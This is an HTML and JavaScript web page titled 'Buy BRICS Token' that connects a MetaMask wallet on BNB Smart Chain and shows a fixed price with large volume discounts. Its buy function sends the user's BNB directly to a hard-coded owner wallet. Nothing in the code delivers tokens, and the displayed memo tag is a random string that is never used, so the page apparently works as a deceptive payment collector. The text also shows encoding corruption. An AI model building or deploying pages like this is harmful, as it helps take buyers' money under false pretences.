<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Buy BRICS Token</title>

<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<meta name="theme-color" content="#0b63ff"/>

<style>
/* 1. Reset and Basic Styling (Minimized Spacing) */
:root {
Â  --bg: #f3f6fb;
Â  --card: #ffffff;
Â  --primary: #0b63ff;
Â  --accent: #00b07a;
Â  --muted: #6b7280;
}

* {
Â  box-sizing: border-box;
}

body {
Â  margin: 0;
Â  font-family: "Vazirmatn", "Arial", sans-serif;
Â  background: #f3f6fb;
Â  padding: 15px; /* Reduced padding */
Â  display: flex;
Â  align-items: flex-start;
Â  justify-content: center;
Â  min-height: 100vh;
Â  direction: ltr; /* Ensure LTR */
}

.container {
Â  width: 100%;
Â  max-width: 380px; /* Reduced max width for mobile feel */
Â  margin: auto;
}

.card {
Â  background: var(--card);
Â  border-radius: 12px; /* Reduced border-radius */
Â  padding: 15px; /* Reduced padding */
Â  box-shadow: 0 8px 25px rgba(11, 99, 255, 0.1);
Â  display: flex;
Â  gap: 10px; /* Reduced gap */
Â  flex-direction: column;
}

/* Header & Logo */
.logo {
Â  width: 80px;
Â  height: 80px;
Â  border-radius: 50%;
Â  margin: 0 auto 10px;
Â  display: flex;
Â  align-items: center;
Â  justify-content: center;
Â  background: linear-gradient(180deg, #fff, #f4f8ff);
Â  border: 3px solid rgba(11, 99, 255, 0.12);
Â  box-shadow: 0 4px 10px rgba(11, 99, 255, 0.08);
}

.logo img {
Â  width: 100%;
Â  height: 100%;
Â  object-fit: contain;
}

h1 {
Â  color: #333;
Â  font-size: 18px;
Â  margin: 0 0 5px; /* Reduced margin */
Â  text-align: center;
}

.sub {
Â  text-align: center;
Â  color: var(--muted);
Â  font-weight: 600;
Â  font-size: 13px;
Â  margin-bottom: 10px; /* Reduced margin */
}

/* Contract Address Row */
.contract-row {
Â  display: flex;
Â  gap: 5px;
Â  align-items: center;
Â  justify-content: center;
Â  margin-bottom: 10px; /* Reduced margin */
}

.contract-box {
Â  background: #eef5ff;
Â  padding: 5px 8px;
Â  border-radius: 8px;
Â  font-weight: 800;
Â  font-size: 12px;
Â  direction: ltr;
Â  color: var(--primary);
}

.copy-btn {
Â  background: transparent;
Â  border: none;
Â  color: var(--primary);
Â  cursor: pointer;
Â  font-weight: 800;
Â  font-size: 13px;
}

/* Price Line */
.price-line {
Â  text-align: center;
Â  font-weight: 700;
Â  font-size: 14px;
Â  margin-bottom: 15px;
}

/* Input Row */
.input-row {
Â  display: flex;
Â  gap: 8px;
Â  align-items: center;
Â  background: #f7f9fc;
Â  border: 1px solid #e6eefb;
Â  border-radius: 10px;
Â  padding: 10px;
}

.amount-input {
Â  flex: 1;
Â  padding: 0;
Â  font-size: 16px;
Â  border: none;
Â  outline: none;
Â  background: transparent;
Â  direction: ltr;
}

.token-tag {
Â  min-width: 60px;
Â  background: var(--primary);
Â  color: #fff;
Â  border-radius: 6px;
Â  padding: 6px;
Â  text-align: center;
Â  font-weight: 900;
Â  letter-spacing: 0.5px;
Â  font-size: 13px;
}

/* Calculation Previews */
.calc-row {
Â  display: flex;
Â  justify-content: space-between;
Â  margin-top: 5px;
Â  font-size: 12px;
Â  color: var(--muted);
Â  font-weight: 700;
Â  margin-bottom: 15px;
}

/* Memo Tag */
.memo-tag {
Â  font-weight: 800;
Â  font-size: 13px;
Â  color: #333;
Â  text-align: left;
Â  margin-bottom: 15px;
}

/* Balances */
.balances {
Â  display: grid;
Â  grid-template-columns: 1fr 1fr;
Â  gap: 8px;
Â  margin-bottom: 15px;
Â  padding: 8px;
Â  border-radius: 8px;
Â  background: #f3f6fb;
}

.bal-box {
Â  background: #fff;
Â  padding: 8px;
Â  border-radius: 8px;
Â  border: 1px solid #eef5ff;
Â  font-size: 12px;
Â  font-weight: 700;
Â  text-align: left;
}

.bal-label {
Â  font-size: 10px;
Â  color: var(--muted);
Â  margin-bottom: 3px;
}

.bal-value {
Â  font-weight: 900;
Â  color: #111;
Â  direction: ltr;
}

/* Buttons */
.connect-btn,
.buy-btn {
Â  padding: 12px;
Â  border-radius: 10px;
Â  border: none;
Â  cursor: pointer;
Â  font-weight: 900;
Â  color: #fff;
Â  width: 100%;
Â  margin-top: 5px;
Â  font-size: 16px;
}

.connect-btn {
Â  background: linear-gradient(90deg, #0b63ff, #2e8bff);
Â  box-shadow: 0 4px 15px rgba(11, 99, 255, 0.2);
}

.buy-btn {
Â  background: linear-gradient(90deg, #00b07a, #0076f3);
Â  box-shadow: 0 4px 15px rgba(0, 112, 240, 0.2);
}

.buy-btn:disabled {
Â  opacity: 0.5;
Â  cursor: not-allowed;
}

.small-status {
Â  min-height: 15px;
Â  font-weight: 700;
Â  color: var(--muted);
Â  font-size: 11px;
Â  margin-top: 5px;
}

/* Spinner */
.spinner{display:inline-block;width:14px;height:14px;border-radius:50%;border:2px solid rgba(0,0,0,0.08);border-top-color:var(--primary);animation:spin 1s linear infinite;vertical-align:middle;margin-left:5px;visibility:hidden}
.spinner.visible{visibility:visible}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
Â  <div class="container">
Â  Â  <div class="card" role="main" aria-labelledby="title">
Â  Â  Â  
Â  Â  Â  <div class="logo">
Â  Â  Â  Â  <img src="BRICS_LOGO.png" alt="BRICS logo"/> Â  Â  Â  </div>
Â  Â  Â  
Â  Â  Â  <h1 id="title">Buy BRICS Token</h1>
Â  Â  Â  <div class="sub">Please add this contract address to your MetaMask before buying:</div>
Â  Â  Â  
Â  Â  Â  <div class="contract-row">
Â  Â  Â  Â  <div id="contractBox" class="contract-box" title="Click to copy">0xAF20...3037</div>
Â  Â  Â  Â  <button id="copyContract" class="copy-btn">Copy</button>
Â  Â  Â  </div>
Â  Â  Â  
Â  Â  Â  <div class="price-line">
Â  Â  Â  Â  BRICS: <span id="priceText">$3.11</span>
Â  Â  Â  </div>

Â  Â  Â  <div class="input-row">
Â  Â  Â  Â  <input id="bricsAmount" class="amount-input" type="number" min="1" placeholder="e.g. 1000" />
Â  Â  Â  Â  <div class="token-tag">BRICS</div>
Â  Â  Â  </div>

Â  Â  Â  <div class="calc-row">
Â  Â  Â  Â  <div id="usdPreview">USD to pay: $0.00</div>
Â  Â  Â  Â  <div id="discountPreview">Discount: 0.0%</div>
Â  Â  Â  </div>
Â  Â  Â  
Â  Â  Â  <div class="memo-tag">
Â  Â  Â  Â  MEMO TAG: <span id="memoTag">----</span>
Â  Â  Â  </div>
Â  Â  Â  
Â  Â  Â  <div class="balances">
Â  Â  Â  Â  <div class="bal-box">
Â  Â  Â  Â  Â  <div class="bal-label">My Wallet / BNB Balance</div>
Â  Â  Â  Â  Â  <div class="bal-value" id="bnbBal">0.0 BNB ($0.0)</div>
Â  Â  Â  Â  </div>
Â  Â  Â  Â  <div class="bal-box">
Â  Â  Â  Â  Â  <div class="bal-label">BRICS Token Balance</div>
Â  Â  Â  Â  Â  <div class="bal-value" id="bricsBal">0.0 BRICS ($0.0)</div>
Â  Â  Â  Â  </div>
Â  Â  Â  </div>
Â  Â  Â  
Â  Â  Â  <button id="connectBtn" class="connect-btn">
Â  Â  Â  Â  Connect MetaMask <span id="connSpinner" class="spinner"></span>
Â  Â  Â  </button>
Â  Â  Â  
Â  Â  Â  <button id="buyBtn" class="buy-btn" disabled>Buy BRICS</button>
Â  Â  Â  
Â  Â  Â  <div id="status" class="small-status">Status: Ready</div>

Â  Â  </div>
Â  </div>

<script>
/* ===================== CONFIG ===================== */
const BRICS_CONTRACT = "0xAF2009350F6ECBE22c23A505a590239c7aaA3037".toLowerCase();
const OWNER_ADDRESS = "0x67594E1D30Cec8a5f906C8278A1BC694641486cf".toLowerCase(); // The address that receives BNB
const CHAIN_ID_BSC = 56;
const BRICS_USD_PRICE = 3.11; // ðŸ’¡ FIXED PRICE
const MIN_BRICS_BUY = 100; // Minimum BRICS amount for discount calculation
const WBNB = "0xBB4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c".toLowerCase(); // WBNB for contract interaction (not used for price, but good to keep)

/* ABIs (Only ERC20 is needed for balances) */
const ERC20_ABI = ["function balanceOf(address) view returns (uint256)","function decimals() view returns (uint8)"];
/* ================================================== */

// DOM Elements
const contractBox = document.getElementById('contractBox');
const copyContract = document.getElementById('copyContract');
const priceText = document.getElementById('priceText');
const bricsAmount = document.getElementById('bricsAmount');
const usdPreview = document.getElementById('usdPreview');
const discountPreview = document.getElementById('discountPreview');
const memoTag = document.getElementById('memoTag');
const connectBtn = document.getElementById('connectBtn');
const buyBtn = document.getElementById('buyBtn');
const bnbBal = document.getElementById('bnbBal');
const bricsBal = document.getElementById('bricsBal');
const statusEl = document.getElementById('status');
const connSpinner = document.getElementById('connSpinner');

contractBox.textContent = short(BRICS_CONTRACT);
copyContract.addEventListener('click', async ()=>{ try{ await navigator.clipboard.writeText(BRICS_CONTRACT); setStatus('Contract address copied âœ…'); }catch(e){ setStatus('Copy failed â€” please copy manually'); }});
contractBox.addEventListener('click', ()=> copyContract.click());

function short(a){ if(!a) return '----'; return a.slice(0,6)+'...'+a.slice(-4); }
function isMobile(){ return /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(navigator.userAgent); }
function setStatus(msg, cls=''){ statusEl.textContent = msg; statusEl.className = 'small-status'; if(cls) statusEl.classList.add(cls); }

/* MEMO */
let currentMemo = genMemo();
memoTag.textContent = currentMemo;
function genMemo(){ return Math.random().toString(36).slice(2,10).toUpperCase(); }

/* Prices (Fixed BRICS Price, Dynamic BNB Price) */
let providerRpc = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
let bnbUsdPrice = 0; // Dynamic BNB price
let bricsPriceBNB = 0; // Calculated BRICS price in BNB
let bricsDecimals = 18; // Default, will try to fetch

async function fetchBnbUsd(){
Â  try{
Â  Â  const res = await fetch("https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT");
Â  Â  const j = await res.json();
Â  Â  bnbUsdPrice = parseFloat(j.price);
Â  Â  
Â  Â  // Calculate BRICS price in BNB based on the fixed USD price
Â  Â  if (bnbUsdPrice > 0) {
Â  Â  Â  bricsPriceBNB = BRICS_USD_PRICE / bnbUsdPrice;
Â  Â  Â  priceText.textContent = `BRICS: $${BRICS_USD_PRICE.toFixed(2)} (â‰ˆ ${bricsPriceBNB.toFixed(6)} BNB)`;
Â  Â  } else {
Â  Â  Â  priceText.textContent = `BRICS: $${BRICS_USD_PRICE.toFixed(2)} (BNB Price Unavailable)`;
Â  Â  }
Â  Â  
Â  Â  return bnbUsdPrice;
Â  }catch(e){ 
Â  Â  console.error("fetchBnbUsd failed", e); 
Â  Â  bnbUsdPrice = 0; 
Â  Â  priceText.textContent = `BRICS: $${BRICS_USD_PRICE.toFixed(2)} (Error)`;
Â  Â  throw e; 
Â  }
}

async function updatePrices(){
Â  connSpinner.classList.add('visible');
Â  await fetchBnbUsd();
Â  connSpinner.classList.remove('visible');
Â  updateCalc();
Â  
Â  // Attempt to fetch decimals only once
Â  if (providerRpc && bricsDecimals === 18) {
Â  Â  try {
Â  Â  Â  const token = new ethers.Contract(BRICS_CONTRACT, ERC20_ABI, providerRpc);
Â  Â  Â  bricsDecimals = await token.decimals();
Â  Â  } catch (e) {
Â  Â  Â  console.warn("Failed to fetch token decimals, assuming 18.");
Â  Â  }
Â  }
}
updatePrices();
setInterval(updatePrices, 15000); // Update every 15 seconds

/* discount: linear mapping 100 -> 5% , 1,000,000 -> 50% (Used the original discount logic) */
function calcDiscount(amount){
Â  const a = Number(amount);
Â  if(!a || a < MIN_BRICS_BUY) return 0;
Â  const maxA = 1000000;
Â  if(a >= maxA) return 50;
Â  const minA = MIN_BRICS_BUY;
Â  const minD = 5, maxD = 50;
Â  const ratio = (a - minA) / (maxA - minA);
Â  const d = minD + ratio * (maxD - minD);
Â  return Math.round(d * 100) / 100;
}

/* update preview */
function updateCalc(){
Â  const a = Number(bricsAmount.value);
Â  const disc = calcDiscount(a);
Â  discountPreview.textContent = `Discount: ${disc.toFixed(1)}%`;
Â  
Â  if(!a || !bricsPriceBNB || !bnbUsdPrice){ 
Â  Â  usdPreview.textContent = 'USD to pay: $0.00'; 
Â  } else {
Â  Â  // Calculate total USD based on fixed price and discount
Â  Â  const totalUSD = a * BRICS_USD_PRICE * (1 - disc/100); 
Â  Â  
Â  Â  usdPreview.textContent = `USD to pay: $${totalUSD.toFixed(2)}`;
Â  Â  
Â  Â  // Recalculate total BNB based on calculated BRICS_BNB price
Â  Â  const totalBNB = a * bricsPriceBNB * (1 - disc/100);
Â  Â  
Â  Â  // Update the BNB balance preview with the amount needed
Â  Â  bnbBal.textContent = `${totalBNB.toFixed(6)} BNB ($${totalUSD.toFixed(2)})`;
Â  }
Â  updateBuyState();
}
bricsAmount.addEventListener('input', updateCalc);

/* Wallet connect */
let provider = null, signer = null, user = null;

async function connectWallet(){
Â  if(window.ethereum){
Â  Â  provider = new ethers.providers.Web3Provider(window.ethereum, "any");
Â  Â  connSpinner.classList.add('visible');
Â  Â  try{
Â  Â  Â  const net = await provider.getNetwork();
Â  Â  Â  if(net.chainId !== CHAIN_ID_BSC){
Â  Â  Â  Â  try{ await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: ethers.utils.hexValue(CHAIN_ID_BSC) }] }); }catch(e){ console.warn("switch chain failed", e); }
Â  Â  Â  }
Â  Â  Â  await provider.send("eth_requestAccounts", []);
Â  Â  Â  signer = provider.getSigner();
Â  Â  Â  user = await signer.getAddress();
Â  Â  Â  connectBtn.innerHTML = `Connected: ${short(user)}`;
Â  Â  Â  connectBtn.disabled = true;
Â  Â  Â  setStatus('Wallet connected âœ…');
Â  Â  Â  await refreshBalances();
Â  Â  Â  
Â  Â  Â  // Setup listeners (Keep this part for a full DApp)
Â  Â  Â  if(window.ethereum && window.ethereum.on){
Â  Â  Â  Â  window.ethereum.on('accountsChanged', async (accounts)=>{ if(accounts && accounts.length){ user = accounts[0]; connectBtn.innerHTML=`Connected: ${short(user)}`; await refreshBalances(); } else { user = null; connectBtn.innerHTML='Connect MetaMask'; connectBtn.disabled=false; setStatus('Account disconnected'); }});
Â  Â  Â  Â  window.ethereum.on('chainChanged', ()=> setTimeout(()=>location.reload(),300));
Â  Â  Â  }
Â  Â  Â  updateBuyState();
Â  Â  }catch(e){ 
Â  Â  Â  console.error(e); 
Â  Â  Â  setStatus('Connection failed: '+(e.message||e),'error'); 
Â  Â  }
Â  Â  connSpinner.classList.remove('visible');
Â  } else {
Â  Â  setStatus('MetaMask not found â€” Please install extension or use the app.','error');
Â  Â  window.open('https://metamask.io/download.html','_blank');
Â  }
}

/* refresh balances */
async function refreshBalances(){
Â  if(!provider || !user || bnbUsdPrice === 0) return;
Â  try{
Â  Â  const rawBnb = await provider.getBalance(user);
Â  Â  const bnb = parseFloat(ethers.utils.formatEther(rawBnb));
Â  Â  bnbBal.textContent = `${bnb.toFixed(6)} BNB ($${(bnb*bnbUsdPrice).toFixed(2)})`;
Â  Â  
Â  Â  // token balance 
Â  Â  const token = new ethers.Contract(BRICS_CONTRACT, ERC20_ABI, provider);
Â  Â  const rawTok = await token.balanceOf(user);
Â  Â  const tok = parseFloat(ethers.utils.formatUnits(rawTok, bricsDecimals));
Â  Â  
Â  Â  // Calculation using fixed price
Â  Â  const tokUsdValue = tok * BRICS_USD_PRICE;
Â  Â  bricsBal.textContent = `${tok.toFixed(4)} BRICS ($${tokUsdValue.toFixed(2)})`;
Â  }catch(e){ 
Â  Â  console.error('refreshBalances error', e); 
Â  }
}

/* buy flow: send BNB to OWNER_ADDRESS directly */
function updateBuyState(){
Â  const a = Number(bricsAmount.value);
Â  buyBtn.disabled = !(signer && a >= 1 && bricsPriceBNB > 0);
}

async function buyBRICS(){
Â  if(!signer){ setStatus('Please connect your wallet first','error'); return; }
Â  const amountBRICS = Number(bricsAmount.value);
Â  if(!amountBRICS || amountBRICS < 1){ setStatus('Enter a valid BRICS amount','error'); return; }
Â  
Â  const discount = calcDiscount(amountBRICS);
Â  const totalBNB = amountBRICS * bricsPriceBNB * (1 - discount/100);
Â  setStatus('Preparing transaction...');
Â  
Â  try{
Â  Â  // send BNB to owner
Â  Â  const txObj = { 
Â  Â  Â  to: OWNER_ADDRESS, 
Â  Â  Â  value: ethers.utils.parseUnits(totalBNB.toFixed(18), 'ether') 
Â  Â  };
Â  Â  const txResp = await signer.sendTransaction(txObj);
Â  Â  setStatus('Transaction sent: ' + short(txResp.hash));
Â  Â  await txResp.wait();
Â  Â  setStatus('âœ… Transaction successful â€” Tx: ' + short(txResp.hash));
Â  Â  
Â  Â  // regen memo and refresh balances
Â  Â  currentMemo = genMemo(); 
Â  Â  memoTag.textContent = currentMemo;
Â  Â  await refreshBalances();
Â  }catch(e){ 
Â  Â  console.error('buyBRICS err', e); 
Â  Â  setStatus('Error sending transaction: ' + (e.message||e),'error'); 
Â  }
}

/* init */
document.addEventListener('DOMContentLoaded', ()=>{
Â  setStatus('Ready â€” Please connect your wallet');
});
connectBtn.addEventListener('click', connectWallet);
buyBtn.addEventListener('click', buyBRICS);
setInterval(()=>{ updateBuyState(); }, 1000); // Check buy button state
</script>
</body>
</html>
